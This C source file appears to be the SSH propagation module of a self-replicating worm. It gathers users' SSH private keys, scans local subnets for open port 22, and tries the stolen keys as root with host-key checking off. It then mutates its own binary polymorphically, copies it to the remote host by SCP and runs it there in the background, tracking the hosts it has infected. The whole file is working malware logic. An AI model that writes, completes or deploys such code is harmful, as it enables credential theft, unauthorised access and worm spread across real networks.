#define _POSIX_C_SOURCE 200809L
#include "cve_ssh_propagation.h"
#include "utils.h"
#include "state_manager.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>

// Configuration
#define CVE_SSH_PROPAGATION_ID 2
#define MAX_SSH_KEYS 100
#define SSH_USER "root"
#define SSH_TIMEOUT 10
#define REMOTE_WORM_PATH "/tmp/worm"

// Global SSH key storage
static char* ssh_key_list[MAX_SSH_KEYS];
static int ssh_key_count = 0;
static int ssh_keys_discovered = 0;

// Global network storage (discovered in scan)
static char* discovered_networks[10];
static int discovered_network_count = 0;

// Global vulnerable hosts storage (discovered during scan phase)
#define MAX_VULNERABLE_HOSTS 50
static char* vulnerable_hosts[MAX_VULNERABLE_HOSTS];
static int vulnerable_host_count = 0;

/**
 * Discover SSH Private Keys
 * Scans /home directories for user SSH private keys (id_rsa files).
 * Results are cached after first discovery to avoid redundant filesystem scans.
 * 
 * @note Keys are stored in global ssh_key_list array. This function should be
 *       called during scan phase before attempting propagation.
 * @note Requires read access to /home/<user>/.ssh/id_rsa files.
 */
static void discover_ssh_keys(void) {
    if (ssh_keys_discovered) return;
    
    ssh_key_count = read_ssh_keys(ssh_key_list, MAX_SSH_KEYS);
    ssh_keys_discovered = 1;
    
    if (ssh_key_count > 0) {
        printf("[*] Discovered %d SSH key(s)\n", ssh_key_count);
    }
}

/**
 * Discover Local Network Ranges
 * Identifies /24 network prefixes from local interface IP addresses.
 * Networks are cached after first discovery to avoid redundant network queries.
 * 
 * Algorithm:
 *   1. Enumerate all local network interfaces (excluding loopback)
 *   2. Extract IP addresses and convert to /24 network prefixes (replace last octet with "0")
 *   3. Deduplicate networks (same /24 may appear on multiple interfaces)
 *   4. Store in global discovered_networks array for use in host scanning
 * 
 * @note Network prefixes are used for scanning potential propagation targets.
 *       Falls back to default Docker network ranges if no interfaces are found.
 */
static void discover_networks(void) {
    if (discovered_network_count > 0) return;
    
    char* ip_list[10];
    int ip_count = 0;
    get_local_ips(ip_list, &ip_count, 10);
    
    // Extract /24 network prefixes by replacing last octet with "0"
    for (int i = 0; i < ip_count && discovered_network_count < 10; i++) {
        char network[16];
        strncpy(network, ip_list[i], sizeof(network) - 1);
        network[sizeof(network) - 1] = '\0';
        
        // Find last dot and replace everything after it with "0"
        char *last_dot = strrchr(network, '.');
        if (last_dot) {
            strcpy(last_dot + 1, "0");
            
            // Deduplicate: check if this network is already in the list
            int found = 0;
            for (int j = 0; j < discovered_network_count; j++) {
                if (strcmp(discovered_networks[j], network) == 0) {
                    found = 1;
                    break;
                }
            }
            
            if (!found) {
                discovered_networks[discovered_network_count] = strdup(network);
                discovered_network_count++;
            }
        }
        
        free(ip_list[i]);
    }
    
    if (discovered_network_count > 0) {
        printf("[*] Discovered %d network(s)\n", discovered_network_count);
    }
}

/**
 * Get Discovered Network Prefixes
 * Retrieves the list of /24 network prefixes discovered during scan phase.
 * 
 * @param networks Output array to populate with network prefix strings (e.g., "172.18.0").
 *                 Must be large enough to hold discovered_network_count entries.
 * @param count Output parameter set to the number of discovered networks.
 * 
 * @note The returned pointers are owned by this module and should not be freed by caller.
 *       Networks remain valid until next scan phase.
 */
void get_discovered_networks(char** networks, int* count) {
    *count = discovered_network_count;
    for (int i = 0; i < discovered_network_count; i++) {
        networks[i] = discovered_networks[i];
    }
}

/**
 * Get SSH Key Count
 * Returns the number of SSH private keys discovered during scan phase.
 * 
 * @return Number of discovered SSH keys, or 0 if none found or scan not performed.
 */
int get_ssh_key_count(void) {
    return ssh_key_count;
}

/**
 * Get Vulnerable Hosts List
 * Retrieves the list of vulnerable hosts discovered during scan phase.
 * A host is considered vulnerable if it has SSH port 22 open and SSH keys are available.
 * 
 * @param hosts Output array to populate with vulnerable host IP addresses.
 *              Must be large enough to hold at least max_hosts entries.
 * @param count Output parameter set to the number of hosts returned (min of
 *              vulnerable_host_count and max_hosts).
 * @param max_hosts Maximum number of hosts to return (prevents buffer overflow).
 * @return Total number of vulnerable hosts found (may be greater than *count if
 *         max_hosts limit is reached).
 * 
 * @note The returned pointers are owned by this module and should not be freed by caller.
 *       Hosts remain valid until next scan phase.
 */
int get_vulnerable_hosts(char** hosts, int* count, int max_hosts) {
    *count = (vulnerable_host_count < max_hosts) ? vulnerable_host_count : max_hosts;
    for (int i = 0; i < *count; i++) {
        hosts[i] = vulnerable_hosts[i];
    }
    return vulnerable_host_count;
}

/**
 * CVE SSH Propagation Scan Handler
 * Performs local and remote scanning to discover vulnerable hosts
 * 
 * Scan logic:
 * 1. Local scan: Discover SSH keys from /home/USER/.ssh/id_rsa
 * 2. Local scan: Discover local networks from interface IPs
 * 3. Remote scan: Scan all hosts in discovered networks for SSH port 22
 * 4. Store vulnerable hosts (keys exist + port 22 open) internally
 * 5. Return vulnerable=true if any vulnerable hosts found
 * 
 */
cve_scan_result_t cve_ssh_propagation_scan(const char* target_ip) {
    (void)target_ip;
    
    cve_scan_result_t result = {0};
    result.cve_id = CVE_SSH_PROPAGATION_ID;
    
    // Clear previous vulnerable hosts list
    for (int i = 0; i < vulnerable_host_count; i++) {
        free(vulnerable_hosts[i]);
    }
    vulnerable_host_count = 0;
    
    discover_ssh_keys();
    if (ssh_key_count == 0) {
        result.is_vulnerable = 0;
        result.confidence = 0;
        result.port_open = 0;
        result.service_type[0] = '\0';
        return result;
    }
    
    discover_networks();
    if (discovered_network_count == 0) {
        char* ip_list[10];
        int ip_count = 0;
        get_local_ips(ip_list, &ip_count, 10);
        
        for (int i = 0; i < ip_count && discovered_network_count < 10; i++) {
            char network[16];
            strncpy(network, ip_list[i], sizeof(network) - 1);
            network[sizeof(network) - 1] = '\0';
            
            char *last_dot = strrchr(network, '.');
            if (last_dot) {
                strcpy(last_dot + 1, "0");
                
                int found = 0;
                for (int j = 0; j < discovered_network_count; j++) {
                    if (strcmp(discovered_networks[j], network) == 0) {
                        found = 1;
                        break;
                    }
                }
                
                if (!found) {
                    discovered_networks[discovered_network_count] = strdup(network);
                    discovered_network_count++;
                }
            }
            
            free(ip_list[i]);
        }
    }
    
    // Fallback to default network ranges
    if (discovered_network_count == 0) {
        discovered_networks[0] = strdup("172.20.0");
        discovered_networks[1] = strdup("172.18.0");
        discovered_network_count = 2;
    }
    
    // Remote scan: Scan all hosts in discovered networks
    printf("[*] Scanning networks for SSH propagation targets...\n");
    for (int i = 0; i < discovered_network_count && i < 10; i++) {
        char* network = discovered_networks[i];
        char base_network[16];
        strncpy(base_network, network, strlen(network) - 2);
        base_network[strlen(network) - 2] = '\0';
        
        // Scan hosts 1-10 in each /24 subnet
        for (int host = 1; host <= 10 && vulnerable_host_count < MAX_VULNERABLE_HOSTS; host++) {
            char ip[16];
            snprintf(ip, sizeof(ip), "%s.%d", base_network, host);
            
            if (scan_port(ip, 22, 2)) {
                vulnerable_hosts[vulnerable_host_count] = strdup(ip);
                vulnerable_host_count++;
                printf("[+] Found vulnerable host: %s (SSH port 22 open)\n", ip);
            }
        }
    }
    
    // Return result based on whether any vulnerable hosts were found
    if (vulnerable_host_count > 0) {
        result.is_vulnerable = 1;
        result.confidence = 8;
        result.port_open = 22;
        strncpy(result.service_type, "SSH", sizeof(result.service_type) - 1);
        printf("[*] Scan complete: Found %d vulnerable host(s) for SSH propagation\n", vulnerable_host_count);
    } else {
        result.is_vulnerable = 0;
        result.confidence = 0;
        result.port_open = 0;
        result.service_type[0] = '\0';
        printf("[*] Scan complete: No vulnerable hosts found\n");
    }
    
    return result;
}

/**
 * Find Working SSH Key for Target
 * Tests each discovered SSH key against the target host to find one that grants access.
 * 
 * @param ip Target host IP address to test SSH key access.
 * @return Path to SSH private key file that successfully authenticates, or NULL if none work.
 * 
 * @note Uses SSH connection test with timeout to avoid hanging on unreachable hosts.
 * @note Some keys may not be authorized for specific hosts even if they exist locally.
 */
static char* find_working_key(const char* ip) {
    for (int i = 0; i < ssh_key_count; i++) {
        char test_cmd[512];
        snprintf(test_cmd, sizeof(test_cmd),
            "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
            "-i %s %s@%s 'echo test' 2>/dev/null",
            SSH_TIMEOUT, ssh_key_list[i], SSH_USER, ip);
        
        int result = system(test_cmd);
        if (result == 0) {
            return ssh_key_list[i];
        }
    }
    return NULL;
}

/**
 * Propagate to a single target host
 * Internal helper function for actual propagation logic
 */
static int propagate_to_host(const char* target_ip) {
    // Skip if already infected
    if (is_infected(target_ip)) {
        printf("[*] %s already infected, skipping\n", target_ip);
        return 1;
    }
    
    // Re-verify port is open (may have changed since scan)
    if (!scan_port(target_ip, 22, 2)) {
        return 0;
    }
    
    printf("[+] SSH Server found at %s!\n", target_ip);
    
    char* key_path = find_working_key(target_ip);
    if (!key_path) {
        printf("[-] No working SSH key found for %s\n", target_ip);
        return 0;
    }
    
    printf("[+] Using SSH key for user %s on %s\n", SSH_USER, target_ip);
    
    printf("[*] Attempting infection on %s via SSH...\n", target_ip);
    
    unsigned char* worm_content = NULL;
    size_t file_size = 0;
    int fd = -1;
    
    char* fd_str = getenv("MEMFD_FD");
    if (fd_str) {
        fd = atoi(fd_str);
        printf("[*] Reading from memfd file descriptor: %d\n", fd);
        
        if (fcntl(fd, F_GETFD) != -1) {
            off_t size = lseek(fd, 0, SEEK_END);
            if (size >= 0) {
                file_size = (size_t)size;
                lseek(fd, 0, SEEK_SET);
                
                worm_content = malloc(file_size);
                if (worm_content) {
                    ssize_t bytes_read = read(fd, worm_content, file_size);
                    if (bytes_read < 0 || (size_t)bytes_read != file_size) {
                        free(worm_content);
                        worm_content = NULL;
                    } else {
                        printf("[+] Successfully read %zu bytes from memfd\n", file_size);
                    }
                }
            }
        }
    }
    
    if (!worm_content) {
        printf("[*] Falling back to reading from /proc/self/exe\n");
        char* exe_path = get_executable_path(NULL);
        if (!exe_path) {
            exe_path = strdup("/proc/self/exe");
        }
        
        FILE* f = fopen(exe_path, "rb");
        if (!f) {
            printf("[-] Error reading own binary: %s\n", strerror(errno));
            free(exe_path);
            return 0;
        }
        
        fseek(f, 0, SEEK_END);
        long file_size_long = ftell(f);
        fseek(f, 0, SEEK_SET);
        
        if (file_size_long < 0) {
            fclose(f);
            free(exe_path);
            return 0;
        }
        
        file_size = (size_t)file_size_long;
        
        worm_content = malloc(file_size);
        if (!worm_content) {
            fclose(f);
            free(exe_path);
            return 0;
        }
        
        size_t bytes_read = fread(worm_content, 1, file_size, f);
        fclose(f);
        free(exe_path);
        
        if (bytes_read != file_size) {
            free(worm_content);
            return 0;
        }
        
        printf("[+] Successfully read %zu bytes from file\n", file_size);
    }
    
    printf("[*] Applying polymorphic mutation...\n");
    size_t mutated_size;
    unsigned char* mutated_content = polimorfism(worm_content, file_size, &mutated_size);
    free(worm_content);
    
    if (!mutated_content) {
        printf("[-] Error applying polymorphic mutation\n");
        return 0;
    }
    
    printf("[*] Polymorphic mutation applied: %zu -> %zu bytes\n", file_size, mutated_size);
    
    const char* temp_worm = "/tmp/worm_temp";
    FILE* temp_f = fopen(temp_worm, "wb");
    if (!temp_f) {
        printf("[-] Error creating temporary file\n");
        free(mutated_content);
        return 0;
    }
    
    fwrite(mutated_content, 1, mutated_size, temp_f);
    fclose(temp_f);
    free(mutated_content);
    
    chmod(temp_worm, 0755);
    
    char check_cmd[512];
    snprintf(check_cmd, sizeof(check_cmd), "test -f %s && echo 'EXISTS'", REMOTE_WORM_PATH);
    
    char result_file[256];
    snprintf(result_file, sizeof(result_file), "/tmp/check_%s.txt", target_ip);
    
    char check_full_cmd[1024];
    snprintf(check_full_cmd, sizeof(check_full_cmd),
        "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=%d "
        "-i %s %s@%s '%s' > %s 2>/dev/null",
        SSH_TIMEOUT, key_path, SSH_USER, target_ip, check_cmd, result_file);
    
    system(check_full_cmd);
    
    FILE* check_f = fopen(result_file, "r");
    if (check_f) {
        char check_result[64];
        if (fgets(check_result, sizeof(check_result), check_f)) {
            if (strstr(check_result, "EXISTS")) {
                printf("[*] Target %s already infected.\n", target_ip);
                fclose(check_f);
                unlink(result_file);
                unlink(temp_worm);
                return 1;
            }
        }
        fclose(check_f);
        unlink(result_file);
    }
    
    // Transfer mutated binary via SCP
    printf("[*] Transferring worm to %s via SCP...\n", target_ip);
    if (!scp_transfer(target_ip, key_path, SSH_USER, temp_worm, REMOTE_WORM_PATH)) {
        printf("[-] Error transferring worm to %s\n", target_ip);
        unlink(temp_worm);
        return 0;
    }
    
    unlink(temp_worm);
    
    printf("[*] Setting executable permissions on remote...\n");
    char chmod_cmd[512];
    snprintf(chmod_cmd, sizeof(chmod_cmd), "chmod +x %s", REMOTE_WORM_PATH);
    run_ssh_command(target_ip, key_path, SSH_USER,     chmod_cmd);
    
    printf("[+] Executing worm on %s...\n", target_ip);
    char exec_cmd[512];
    snprintf(exec_cmd, sizeof(exec_cmd), "nohup %s > /tmp/worm.log 2>&1 &", REMOTE_WORM_PATH);
    run_ssh_command(target_ip, key_path, SSH_USER, exec_cmd);
    
    mark_infected(target_ip);
    printf("[+] Infection complete for %s\n", target_ip);
    return 1;
}

/**
 * CVE SSH Propagation Execution Handler
 * Propagates worm to all vulnerable hosts discovered during scan phase.
 * 
 * Execution Strategy:
 *   - Retrieves vulnerable hosts list from scan phase (hosts with SSH keys + port 22 open)
 *   - Filters out already-infected hosts to prevent duplicate infections and loops
 *   - Propagates to each uninfected vulnerable host using propagate_to_host()
 *   - Returns success if at least one host is successfully infected
 * 
 * @param target_ip Ignored. Handler uses vulnerable hosts discovered during scan phase.
 * @return 1 if at least one propagation succeeded, 0 if all attempts failed.
 * 
 * @note Relies on scan phase to populate vulnerable_hosts list. If scan phase hasn't
 *       been executed or found no vulnerable hosts, this function returns failure.
 * @note State management (is_infected/mark_infected) prevents re-infecting same hosts
 *       across multiple execution phases, avoiding infinite propagation loops.
 */
int cve_ssh_propagation_execute(const char* target_ip) {
    (void)target_ip;
    
    // Get vulnerable hosts discovered during scan phase
    char* hosts[MAX_VULNERABLE_HOSTS];
    int host_count = 0;
    get_vulnerable_hosts(hosts, &host_count, MAX_VULNERABLE_HOSTS);
    
    if (host_count == 0) {
        printf("[-] No vulnerable hosts to propagate to\n");
        return 0;
    }
    
    char* uninfected_hosts[MAX_VULNERABLE_HOSTS];
    int uninfected_count = 0;
    for (int i = 0; i < host_count; i++) {
        if (!is_infected(hosts[i])) {
            uninfected_hosts[uninfected_count] = hosts[i];
            uninfected_count++;
        } else {
            printf("[*] Skipping %s (already infected)\n", hosts[i]);
        }
    }
    
    if (uninfected_count == 0) {
        printf("[*] All vulnerable hosts are already infected, skipping propagation\n");
        return 1;
    }
    
    printf("[*] Propagating to %d uninfected vulnerable host(s)...\n", uninfected_count);
    
    int success_count = 0;
    for (int i = 0; i < uninfected_count; i++) {
        printf("\n--- Propagating to %s ---\n", uninfected_hosts[i]);
        if (propagate_to_host(uninfected_hosts[i])) {
            success_count++;
        }
    }
    
    printf("\n[+] Propagation complete: %d/%d uninfected hosts infected\n", success_count, uninfected_count);
    return (success_count > 0) ? 1 : 0;
}

